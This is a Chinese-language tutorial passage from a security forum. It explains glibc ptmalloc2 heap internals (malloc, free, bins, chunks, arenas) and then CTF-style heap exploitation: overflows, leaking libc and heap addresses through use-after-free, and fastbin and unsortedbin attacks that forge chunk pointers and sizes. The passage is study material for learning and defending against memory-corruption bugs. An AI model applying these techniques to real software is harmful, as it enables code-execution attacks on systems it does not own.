<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/10650)

> 先知社区，先知安全技术社区

1.1 堆概述
-------

### 1.1.1 堆数据结构，申请与释放

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129191115-11c85e92-5105-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129191115-11c85e92-5105-1.png)

堆和栈都是一种数据结构，在内存中线性分布储存数据，栈由高地址向低地址伸展，堆由低地址向高地址伸展。堆的位置一般都在 bss 段的高地址处。

在程序运行过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长。我们一般称管理堆的那部分程序为堆管理器。

目前 Linux 标准发行版中使用的堆分配器是 glibc 中的堆分配器：ptmalloc2。ptmalloc2 主要是通过 malloc/free 函数来分配和释放内存块。

**_libc_malloc**

一般我们会使用 malloc 函数来申请内存块，可是当仔细看 glibc 的源码实现时，其实并没有 malloc 函数。其实该函数真正调用的是 **libc_malloc 函数。为什么不直接写个 malloc 函数呢，因为有时候我们可能需要不同的名称。此外，**libc_malloc 函数只是用来简单封装 _int_malloc 函数。_int_malloc 才是申请内存块的核心。下面我们来仔细分析一下具体的实现。

该函数会首先检查是否有内存分配函数的钩子函数（__malloc_hook），这个主要用于用户自定义的堆分配函数，方便用户快速修改堆分配函数并进行测试。这里需要注意的是，**用户申请的字节一旦进入申请内存函数中就变成了无符号整数**。

```
// wapper for int_malloc
void *__libc_malloc(size_t bytes) {
    mstate ar_ptr;
    void * victim;
    // 检查是否有内存分配钩子，如果有，调用钩子并返回.
    void *(*hook)(size_t, const void *) = atomic_forced_read(__malloc_hook);
    if (__builtin_expect(hook != NULL, 0))
        return (*hook)(bytes, RETURN_ADDRESS(0));
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129191134-1d382b9a-5105-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129191134-1d382b9a-5105-1.png)

判断目前的状态是否满足以下条件

*   要么没有申请到内存
*   要么是 mmap 的内存
*   **要么申请到的内存必须在其所分配的 arena 中**

**_int_malloc**

_int_malloc 是内存分配的核心函数，其核心思路有如下

1.  它根据用户申请的**内存块大小**以及**相应大小 chunk 通常使用的频度**（fastbin chunk, small chunk, large chunk），依次实现了不同的分配方法。
2.  它由小到大依次检查不同的 bin 中是否有相应的空闲块可以满足用户请求的内存。
3.  当所有的空闲 chunk 都无法满足时，它会考虑 top chunk。
4.  当 top chunk 也无法满足时，堆分配器才会进行内存块申请。

在进入该函数后，函数立马定义了一系列自己需要的变量，并将用户申请的内存大小转换为内部的 chunk 大小。

fast bin

如果申请的 chunk 的大小位于 fastbin 范围内，**需要注意的是这里比较的是无符号整数**。**此外，是从 fastbin 的头结点开始取 chunk**。

large bin

当 fast bin、small bin 中的 chunk 都不能满足用户请求 chunk 大小时，就会考虑是不是 large bin。但是，其实在 large bin 中并没有直接去扫描对应 bin 中的 chunk，而是先利用 malloc_consolidate（参见 malloc_state 相关函数） 函数处理 fast bin 中的 chunk，将有可能能够合并的 chunk 先进行合并后放到 unsorted bin 中，不能够合并的就直接放到 unsorted bin 中，然后再在下面的大循环中进行相应的处理。**为什么不直接从相应的 bin 中取出 large chunk 呢？这是 ptmalloc 的机制，它会在分配 large chunk 之前对堆中碎片 chunk 进行合并，以便减少堆中的碎片。**

大循环 - 遍历 unsorted bin

**如果程序执行到了这里，那么说明 与 chunk 大小正好一致的 bin (fast bin， small bin) 中没有 chunk 可以直接满足需求 ，但是 large chunk 则是在这个大循环中处理**。

在接下来的这个循环中，主要做了以下的操作

*   按照 FIFO 的方式逐个将 unsorted bin 中的 chunk 取出来
    *   如果是 small request，则考虑是不是恰好满足，是的话，直接返回。
    *   如果不是的话，放到对应的 bin 中。
*   尝试从 large bin 中分配用户所需的内存

该部分是一个大循环，这是为了尝试重新分配 small bin chunk，这是因为我们虽然会首先使用 large bin，top chunk 来尝试满足用户的请求，但是如果没有满足的话，由于我们在上面没有分配成功 small bin，我们并没有对 fast bin 中的 chunk 进行合并，所以这里会进行 fast bin chunk 的合并，进而使用一个大循环来尝试再次分配 small bin chunk。

使用 top chunk

如果所有的 bin 中的 chunk 都没有办法直接满足要求（即不合并），或者说都没有空闲的 chunk。那么我们就只能使用 top chunk 了。

##### 1.1.2 malloc

在 glibc 的 malloc 中，有以下说明：

malloc 函数返回对应大小字节的内存块的指针。

当 n=0 时，返回当前系统允许的堆的最小内存块

当 n 为负数时，由于在大多数系统上，**size_t 是无符号数（这一点非常重要）**，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。

malloc --> __libc_malloc --> _int_malloc

```
__libc_malloc(size)

用户申请的字节一旦进入申请内存函数中就变成了 无符号整数。
寻找钩子hook ----》 寻找arena ----》 调用_int_malloc分配内存 -+--》成功，返回内存
                                          ↑                 |
                                          |                 ↓
                                          +-----分配失败，再寻找一个arena
```

```
_int_malloc()

--------------------------------------------------------------------------------

将size转化为对应的chunk大小 ----》 fastbin ----》 遍历（后进先出），检查大小是否符合 ----》 符合则计算索引 ----》 chunk转换为内存返回
根据大小选择bin            ----》 smallbin ----》获取索引、指针 ----》 检查该bin是否为空 ----》 不为空 ----》将链表中最后一个chunk分配（先进先出）
                                                                                      |           +----》 初始化
                                                                                      +---》 该bin为空
                          ----》 不在fastbin和smallbin中 ----》 malloc_consolidate()：处理fastbin ----》 可以合并的合并，然后放 unsorted bin ----》大循环

----------------------------------------------------------------------------------

大循环 ----》 遍历unsorted bin ----》 FIFO寻找大小刚好合适的bin ----》若有，bin转为内存后返回
循环10000次                                                  ----》若没有，则将当前的unsorted bin按照大小放至对应的small或large中
      ----》 遍历large bin ----》对应的 bin 中从小(链表尾部)到大（头部）进行扫描 ----》 找到第一个合适的返回
      ----》 若大小合适的bin都不存在，则在map中找更大的bin遍历 ----》 找到，返回内存
                                                           ----》 找不到，使用top chunk ----》 满足，分割后返回
                                                                                       ----》 不满足，使用 sysmalloc 来申请内存

------------------------------------------------------------------------------------

//从 fastbin 的头结点开始取 chunk（LIFO）
```

##### 1.1.3 free

在 glibc'中的 free，有以下说明：

free 函数会释放由 p 所指向的内存块。这个内存块有可能是通过 malloc 函数得到的，也有可能是通过相关的函数 realloc 得到的。

当 p 为空指针时，函数不执行任何操作。

**当 p 已经被释放之后，再次释放会出现乱七八糟的效果，这其实就是 `double free`。**

除了被禁用 (mallopt) 的情况下，当释放很大的内存空间时，程序会将这些内存空间还给系统，以便于减小程序所使用的内存空间。

free --> __libc_free --> _int_free

```
_int_free()

检查 ----》是否fastbin ----》是fastbin，放至fastbin链表表头
                      +---》是否mmap分配 ----》 是，munmap_chunk()
                                        +---》 否，合并chunk ----》 向低地址合并 ----》想高地址合并 ----》 下一个是否是top chunk ----》 是，合并到top chunk
                                                                                                                            +---》 否，合并加入unsorted bin
```

##### 1.1.4 内存分配中的系统调用

在前面提到的函数中，无论是 malloc 函数还是 free 函数，我们动态申请和释放内存时，都经常会使用，但是它们并不是真正与系统交互的函数。这些函数背后的系统调用主要是 brk 函数以及 mmap，mummap 函数。 堆进行**申请内存块的操作**

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129191201-2d61d912-5105-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129191201-2d61d912-5105-1.png)

**(s)brk**

对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk 函数，我们可以通过增加 brk 的大小来向操作系统申请内存。

初始时，堆的起始地址 start_brk 以及堆的当前末尾 brk 指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同

*   不开启 ASLR 保护时，start_brk 以及 brk 会指向 data/bss 段的结尾。
*   开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data/bss 段结尾后的随机偏移处。

**例子**

```
/* sbrk and brk example */
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main()
{
        void *curr_brk, *tmp_brk = NULL; //创立空指针

        printf("Welcome to sbrk example:%d\n", getpid()); //读取heap，pid

        /* sbrk(0) gives current program break location */
        tmp_brk = curr_brk = sbrk(0); //通过sbrk空指针赋值
        printf("Program Break Location1:%p\n", curr_brk);
        getchar();

        /* brk(addr) increments/decrements program break location */
        brk(curr_brk+4096);

        curr_brk = sbrk(0);
        printf("Program break Location2:%p\n", curr_brk);
        getchar();

        brk(tmp_brk);

        curr_brk = sbrk(0);
        printf("Program Break Location3:%p\n", curr_brk);
        getchar();

        return 0;
}
```

在第一次调用 brk 函数之前。

从下面的输出中可以看出没用产生堆。

start_brk = brk = end_data = 0x1bd2000

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129191218-375d0a72-5105-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129191218-375d0a72-5105-1.png)

在第二次调用 brk 函数

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129191234-40c705a4-5105-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129191234-40c705a4-5105-1.png)

start_brk = end_data = 0x1bb1000

bak = 0x1bd3000

其中，关于堆的那一行

*   0x01bb1000 是相应堆的起始地址
*   rw-p 表明堆具有可读可写权限，并且属于隐私数据。
*   00000000 表明文件偏移，由于这部分内容并不是从文件中映射得到的，所以为 0。
*   00:00 是主从 (Major/mirror) 的设备号，这部分内容也不是从文件中映射得到的，所以也都为 0。
*   0 表示着 Inode 号。由于这部分内容并不是从文件中映射得到的，所以为 0。

##### 1.1.5 Chunk

chunk 是 glibc 管理内存的基本单位，整个堆在初始化后会被当成一个 free chunk，称为 top chunk，每次用户请求内存时，如果 bins 中没有合适的 chunk，malloc 就会从 top chunk 中进行划分，如果 top chunk 的大小不够，就调用 brk 函数扩展堆的大小，然后从新生成的 top chunk 中进行划分。用户释放内存时，glibc 会先根据情况将释放的 chunk 与其他相邻的 free chunk 合并，然后加入合适的 bin 中。

chunk 的数据结构如下

```
struct malloc_chunk{
    INTERNAL_SIZE_T mchunk_prev_size; 记录被释放的相邻chunk的大小。
    INTERNAL_SIZE_T mchunk_size;      记录当前chunk的大小，chunk的大小都是8字节对齐
    struct malloc_chunk *fd;
    struct malloc_chunk *bk;
    struct malloc_chunk *fd_nextsize;
    struck malloc_chunk *bk_nextsize; 
}
```

1.Fast bin

Fast bin 分类的 chunk 的大小为 32-128 字节 (0x80) 字节，如果 chunk 在被释放时发现其大小满足这个要求，则将该 chunk 放入 Fast Bin。一个最新被加入的 Fast Bin 的 chunk，其 fd 指针指向上一次加入的 Fast Bin 的 chunk。

2.Small bin

Small bin 保存大小为 32-1024（0x400）字节的 chunk，每个放入其中的 chunk 为双链表结构，不同大小的 chunk 储存在对应的链接中。由于时双链表结构，所以他的速度比 fast bin 慢一些。

3.Large bin

大于 1024 字节的 chunk 使用 Large Bin 进行管理。相同大小的 Large Bin 使用 fd 和 bk 指针连接，不同大小的 Large bin 通过 fd_nextsize 和 bk_nextsize 按大小排序连接。

4.Unsorted Bin

Unsorted Bin 相当于 Ptmalloc2 堆管理器的垃圾桶。chunk 被释放后，会先加入 Unsorted Bin 中，等待下次分配使用。在堆管理器的 Unsorted Bin 不为空的时候，用户申请非 Fast Bin 大小内存会先从 Unsorted Bin 中查找，如果找到符合该申请的 chunk(等于或者大于)，则直接分配或者分割该 chunk。

##### 1.1.6 arena

arena 包含一片或者数片连续的内存，对快将会从这片区域中划分给用户。主线程的 arena 被称为 main_arena，它包含 start_brk 和 brk 之间的这片连续内存。一般把 start_brk 和 brk 之间这片连续的内存称为堆。

主线程 arena 只有堆，子线程的 arena 可以有数片连续的内存。如果主线程的堆大小不够分的话，就要通过 brk 函数调用来扩展，但是子线程分配的映射段大小是固定的，不可以扩展的，所以子线程分配处理的一段映射段不够用的话就需要再次使用 mmap 函数来分配新的内存。

#### 1.2 简单的堆漏洞

##### 1.2.1 堆溢出概述

堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（**之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数**），因而导致了数据溢出，并覆盖到**物理相邻的高地址**的下一个堆块。

不难发现，堆溢出漏洞发生的基本前提是

*   程序向堆上写入数据。
*   写入的数据大小没有被良好地控制。

对于攻击者来说，堆溢出漏洞轻则可以使得程序崩溃，重则可以使得攻击者控制程序执行流程。

堆溢出是一种特定的缓冲区溢出（还有栈溢出， bss 段溢出等）。但是其与栈溢出所不同的是，堆上并不存在返回地址等可以让攻击者直接控制执行流程的数据，因此我们一般无法直接通过堆溢出来控制 EIP 。一般来说，我们利用堆溢出的策略是

1.  覆盖与其
    
    物理相邻的下一个 chunk 的内容。
    
    *   prev_size
    *   size，主要有三个比特位，以及该堆块真正的大小。
        *   NON_MAIN_ARENA
        *   IS_MAPPED
        *   PREV_INUSE
        *   the True chunk size
    *   chunk content，从而改变程序固有的执行流。
2.  利用堆中的机制（如 unlink 等 ）来实现任意地址写入（ Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流。
    

##### 1.2.2 堆溢出总结

**1. 寻找堆分配函数**

一般来说堆分配函数数就是 malloc 和 free，但是某些情况下会使用 calloc 分配，calloc 和 molloc 的区别是 calloc 在分配后会自动进行清空。

```
calloc(0x20);
//等同于
ptr=malloc(0x20);
memset(ptr,0,0x20);
```

还有一种分配是经过 realloc 函数进行分配的，realloc 函数可以兼职 malloc 函数和 free 函数的功能

```
#include <stdio.h>

int main(void) 
{
  char *chunk,*chunk1;
  chunk=malloc(16);
  chunk1=realloc(chunk,32);
  return 0;
}
```

realloc 的操作并不是像字面意义上那么简单，其内部会根据不同的情况进行不同操作

*   当 realloc(ptr,size) 的 size 不等于 ptr 的 size 时
    *   如果申请 size > 原来 size
        *   如果 chunk 与 top chunk 相邻，直接扩展这个 chunk 到新 size 大小
        *   如果 chunk 与 top chunk 不相邻，相当于 free(ptr),malloc(new_size)
    *   如果申请 size < 原来 size
        *   如果相差不足以容得下一个最小 chunk(64 位下 32 个字节，32 位下 16 个字节)，则保持不变
        *   如果相差可以容得下一个最小 chunk，则切割原 chunk 为两部分，free 掉后一部分
*   当 realloc(ptr,size) 的 size 等于 0 时，相当于 free(ptr)
*   当 realloc(ptr,size) 的 size 等于 ptr 的 size，不进行任何操作

**2. 寻找危险函数**

通过寻找危险函数，我们快速确定程序是否可能有堆溢出，以及有的话，堆溢出的位置在哪里。

常见的危险函数如下

*   输入
    *   gets，直接读取一行，忽略 `'\x00'`
    *   scanf
    *   vscanf
*   输出
    *   sprintf
*   字符串
    *   strcpy，字符串复制，遇到 `'\x00'` 停止
    *   strcat，字符串拼接，遇到 `'\x00'` 停止
    *   bcopy

**3. 确定填充函数**

这一部分主要是计算**我们开始写入的地址与我们所要覆盖的地址之间的距离**。 一个常见的误区是 malloc 的参数等于实际分配堆块的大小，但是事实上 ptmalloc 分配出来的大小是对齐的。这个长度一般是字长的 2 倍，比如 32 位系统是 8 个字节，64 位系统是 16 个字节。但是对于不大于 2 倍字长的请求，malloc 会直接返回 2 倍字长的块也就是最小 chunk，比如 64 位系统执行`malloc(0)`会返回用户区域为 16 字节的块。

```
#include <stdio.h>

int main(void) 
{
  char *chunk;
  chunk=malloc(0);
  puts("Get input:");
  gets(chunk);
  return 0;
}
```

```
//根据系统的位数，malloc会分配8或16字节的用户空间
0x602000:   0x0000000000000000  0x0000000000000021
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000020fe1
0x602030:   0x0000000000000000  0x0000000000000000
```

**实际上 ptmalloc 分配内存是以双字为基本单位，以 64 位系统为例，分配出来的空间是 16 的整数倍，即用户申请的 chunk 都是 16 字节对齐的。**

#### 1.3 堆利用

在该章节中，我们会按照如下的步骤进行介绍

1.  介绍我们所熟知的动态内存分配的堆的宏观操作
2.  介绍为了达到这些操作所使用的数据结构
3.  介绍利用这些数据结构实现堆的分配与回收的具体操作
4.  由浅入深地介绍堆的各种利用技巧。

##### 8.3.1 通过堆进行信息泄露

**什么叫做信息泄露，leak？**

在 CTF 中，Pwn 题目一般都是运行在远端服务器上的。因此我们不能获知服务器上的 libc.so 地址、Heap 基地址等地址信息，但是在进行利用的时候往往需要这些地址，此时就需要进行信息泄漏。

**信息泄露的目标**

信息泄露的目标有哪些，可以通过看一下内存分布来了解

```
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/pwn
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/pwn
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/pwn
//首先第一个是主模块的基地址，因为只有在开启 PIE(地址无关代码) 的情况下主模块的基地址才会发生改变，因此通常情况下主模块的地址不需要泄漏。
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]  
//第二个是堆地址，堆地址对于进程来说是每次运行都会改变，当然需要控制堆中的数据时可能就需要先泄漏堆基地址。
0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 
0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- 
0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- 
0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
//第三个是 libc.so 的地址，在很多情况下我们只有通过 libc 中的 system 等函数才能实现代码执行，并且  malloc_hook、one_gadgets、IO_FILE 等结构也都储存在 libc 中，因此 libc 的地址也是我们泄漏的目标。 
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
```

**通过什么进行信息泄露**

通过前面的知识我们知道 heap 分为

unsorted bin、fastbin、smallbin、large bin 等，

我们逐个考察这些结构来查看如何进行泄漏。

**unsorted bin**

我们构造两个 unsorted bin 然后查看它的内存，现在在 unsorted bin 链表中存在两个块，第一个块的地址是 0x602000、第二个块的地址是 0x6020f0

```
0x602000:   0x0000000000000000  0x00000000000000d1
0x602010:   0x00007ffff7dd1b78  0x00000000006020f0 <=== 指向下一个块
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
```

```
0x6020f0:   0x0000000000000000  0x00000000000000d1
0x602100:   0x0000000000602000  0x00007ffff7dd1b78 <=== 指向main_arena
0x602110:   0x0000000000000000  0x0000000000000000
0x602120:   0x0000000000000000  0x0000000000000000
```

因此我们知道通过 unsorted bin 我们可以获取到某个堆块的地址和 main_areana 的地址。一旦获取到某个堆块的地址就可以通过 malloc 的 size 进行计算从而获得堆基地址。一旦获取到 main_arena 的地址，因为 main_arena 存在于 libc.so 中就可以计算偏移得出 libc.so 的基地址。

**因此，通过 unsorted bin 可以获得：1.libc.so 的基地址 2.heap 基地址**

**fast bin**

我们构造了两个 fastbin 然后查看它们的内存，现在在 fastbin 链表中存在两个块，第一个块的地址是 0x602040，第二个块的地址是 0x602000

```
0x602000:   0x0000000000000000  0x0000000000000021
0x602010:   0x0000000000000000  0x0000000000000000
```

```
0x602040:   0x0000000000000000  0x0000000000000021
0x602050:   0x0000000000602000  0x0000000000000000 <=== 指向第一个块
```

根据前面的知识我们知道 fastbin 链表最末端的块 fd 域为 0，此后每个块的 fd 域指向前一个块。

**因此通过 fastbin 只能泄漏 heap 的基地址**

**small bin**

我们构造了两个 fastbin 然后查看它们的内存，现在在 fastbin 链表中存在两个块，第一个块的地址是 0x602000，第二个块的地址是 0x6020f0

```
0x602000:   0x0000000000000000  0x00000000000000d1
0x602010:   0x00007ffff7dd1c38  0x00000000006020f0 <=== 下一个块的地址
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
```

```
0x6020f0:   0x0000000000000000  0x00000000000000d1
0x602100:   0x0000000000602000  0x00007ffff7dd1c38 <=== main_arena的地址
0x602110:   0x0000000000000000  0x0000000000000000
0x602120:   0x0000000000000000  0x0000000000000000
```

**因此，通过 smallbin 可以获得：1.libc.so 的基地址 2.heap 基地址**

**哪些漏洞可以用于泄漏**

通过前面的知识我们可以获知堆中存在哪些地址信息，但是想要获取到这些地址需要通过漏洞来实现 一般来说以下漏洞是可以进行信息漏洞的

*   堆内存未初始化
*   堆溢出
*   Use-After-Free
*   越界读
*   heap extend

1. 通过 UAF 读 heapbase：

```
p0 = malloc(0x20);
p1 = malloc(0x20);

free(p0);
free(p1);

printf('heap base:%p',*p1);
```

由于 fastbin list 的特性，当我们构造一条 fastbin list 的时候

```
(0x30)     fastbin[1]: 0x602030 --> 0x602000 --> 0x0
```

存在 chunk 1 -> chunk 0 的现象，如果此时 UAF 漏洞存在，我们可以通过 show chunk 1，将 chunk 0 的地址打印出来

同理可以泄露 libc base

```
p0 = malloc(0x100);
free(p0);
printf("libc: %p\n", *p0);
```

fastbins 是单链表存储结构

unsortedbin、smallbins、largebins 都是双向循环链表存储

并且 free 掉的 chunk，如果大小在 0x20~0x80 之间会直接放到 fastbins 链表上去，大于 0x80 的会先放到 unsortedbin 上，然后进行整理。

**fastbins 的存储采用后进先出的原则：**后 free 的 chunk 会被添加到先 free 的 chunk 的后面；同理，通过 malloc 取出 chunk 时是先去取最新放进去的。

```
free(chunk1)
free(chunk2)
free(chunk3)
----fastbin-----
chunk3->chunk2->chunk1
----------------
malloc(0x10) ->chunk3
----fastbin-----
chunk2->chunk1
----------------
```

因此，fastbins 中的所有 chunk 的 bk 是没有用到的，因为是单链表。

```
#include <stdio.h>
#include <stdlib.h>

int main()
{
    int *p1=malloc(0x10);
    int *p2=malloc(0x10);
    int *p3=malloc(0x20);

    puts("1");  
    free(p1);
    free(p2);
    free(p3);
    return 0;
}
```

断点在 puts 函数

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129193903-f426d5c2-5108-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129193903-f426d5c2-5108-1.png)

查看堆和 bin

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129193944-0c15533e-5109-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129193944-0c15533e-5109-1.png)

然后再下一步，free p1 p2 p3

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194006-19945406-5109-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194006-19945406-5109-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194014-1de9476e-5109-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194014-1de9476e-5109-1.png)

**unsortedbins 的存储采用先进先出的原则：** 就跟队列差不多，先放进去的先出来，但是当它里面只有一个 bin 的时候，fd 和 bk 就会指向同一个地方，main_arena+0x58

```
--------unsortedbins----------
      main_arena+0x58

 unsorted bin chunk1{
    fd;
    bk;
 }

unsorted bin chunk2{
    fd;
    bk;
}
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194024-244fd398-5109-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194024-244fd398-5109-1.png)

测试代码

```
#include <stdio.h>
#include <stdlib.h>


int main()
{
    int *p1=malloc(0x100);
    int *p2=malloc(0x100);    

    puts("1");
    free(p1);
    free(p2);
    return 0;
}
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194033-2952b0ae-5109-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194033-2952b0ae-5109-1.png)

还是断到 puts 上面

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194040-2d818bdc-5109-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194040-2d818bdc-5109-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194047-31d64e66-5109-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194047-31d64e66-5109-1.png)

free p1 之后

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194057-37aa9fb8-5109-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194057-37aa9fb8-5109-1.png)

fastbin attack
--------------

### 原理

首先是因为 free 一个 fastbin 大小的 chunk，会被放入 fastbins 链表中。如果此时通过 malloc`*p=malloc(0x10)`申请一个区域，然后再把它 free 到 fastbin 中，但是不使得 p 的指针为 NULL, 就仍然会指向 chunk 的地址。

然后 fastbin 中的 bin 头的 fd 指针由于后进先出的原理还是指向我们刚刚的那个 chunk，而 p 指针指向的就是这个 chunk 的 fd。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194132-4c7a4984-5109-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194132-4c7a4984-5109-1.png)

此时这个 chunk 的 fd 指针指向的是 0（滞空），那我们就可以通过修改 p 指针将 fd 指针指向我们所需要的**目标地址**，

```
*p=target_addr
 fd=p;
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194214-65ff2104-5109-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194214-65ff2104-5109-1.png)

然后去 malloc 一个跟我们释放的 chunk 相等大小的 chunk，那么本来哪个被 free 掉的 chunk 就会从 fastbin 中被申请到实际堆内存中，然后 fastbin 的链表就被断掉了，这样就会使得 arena 的 fastbin 的 bin 头的 fd 指针指向于我们的 target 地址

```
int *q=malloc(size)
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194229-6e7eda54-5109-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194229-6e7eda54-5109-1.png)

此时 bin 头的 fd 指针已经指向 target 的地址了，如果我们再去 malloc，就是把 target 这块地址 malloc 到堆内存了，这样就可以使用 target 地址，对它进行操作了

```
int *target=malloc(size)
```

### target_addr 的构造

**检测：**从 fastbin 中 malloc 一个 freechunk 的时候，会进行一些检测。

1：malloc 的 freechunk 的大小需要在 fastbin 大小范围内（0x30-0x40 时，却申请一个 0x50 的 chunk，那么就不行）

2：检查 chunk 中的 size 的 PREV_INUSE 的数值，为 1 才能通过检测。

检测 1：检测你要 malloc 的 freechunk 的大小是否在该 chunk 所在的 fastbin 链的大小尺寸范围内（例如：一个 fastbin 链所存储的 chunk 大小必须在 0x30-0x40 之间，但是你要申请的这个 chunk 却是 0x50，那么就会程序就报错退出）。  
检测 2：检测你这个 freechunk 的 size 成员的 PREV_INUSE 为是否为 1，为 1 才可以通过检测。

**构造：**

1. 需要让 target 目标地址指定到 size 成员地址处的数值，能曼珠检测 1

2. 当 target 地址处的数值不能曼珠 fastbin 要求时，可以通过内存地址的偏移，取 target 地址附近的其他地址。例如

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194239-7483d59e-5109-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194239-7483d59e-5109-1.png)

此时我们就不是直接把 target 地址作为攻击的地址，因为它指定的偏移地址处的 size 成员不满足检测 2.

3. 我们选取攻击目标地址的偏移 size 成员数值的 NON_MAIN_ARENA、IS_MAPPED、PREV_INUSE 位都要为 1，然后此时 fastbin 中的 chunk 大小为 0x70~0x80，而伪造 size 成员处的数值为 0x71 时就不能符合要求，但是 0x7f 因为多了 2 个位就可以满足要求。

4. 在二次 malloc 的时候，最好 malloc 一个大小在 0x70~0x80 之间的堆块（从之前的调试可以看出，其实此时的 size 要为 0x60~0x70）这个我是申请了 0x60 和 0x70，但此时 chunk 的大小为 0x71 和 0x81。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194248-79d6ef18-5109-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194248-79d6ef18-5109-1.png)

申请了这样的 chunk 时，我们的目标地址就会被放入 0x70~0x80 范围的 fastbin 中，就可以通过 0x7f 来跳过检测 1

#### 5. 利用 unsortedbin attack 构造一个 0x7f 地址来构造 target_addr

**核心思想**

一般情况下，只能在目标地址上写一个大数值，而且 unsortedbin attack 通常是为了配合 fastbin attack 的构造 target_addr 使用的。

**原理**

unsortedbin 正常存储 freechunk 的结构如图所示，此时这个 freechunk 是我们还可以通过指针操控的（虽然 free 了但没有置空）。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194258-7faa784c-5109-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194258-7faa784c-5109-1.png)

如果在取走堆块之前，将 chunk1 的 bk 指针修改成 target 地址

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211129194305-83ea6a70-5109-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211129194305-83ea6a70-5109-1.png)

此时我们再去 malloc 申请 chunk

就会有操作代码

```
bck = freechunk->bk;
unsorted_chunks(av)->bk = bck;
bck-fd = unsorted_chunks(av);
```

操作过后就如图

